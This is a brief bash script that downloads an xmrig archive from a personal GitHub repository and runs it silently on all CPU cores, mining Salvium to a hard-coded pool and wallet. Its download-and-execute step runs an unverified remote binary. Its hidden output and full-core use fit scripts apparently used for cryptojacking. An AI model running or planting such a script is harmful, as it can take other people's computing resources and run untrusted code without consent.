#!/bin/bash
A=sg.salvium.herominers.com:1230
B=SaLvsAVA3jdDTqSjJbs95BahUPjwo1N9m4oq1LuUmB313Q8dcPUJfKrgkSxqBKWTJw2rbB6UqdqyZLQ15Ej4vCko2J6ZuD8XyRo
C=cus
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
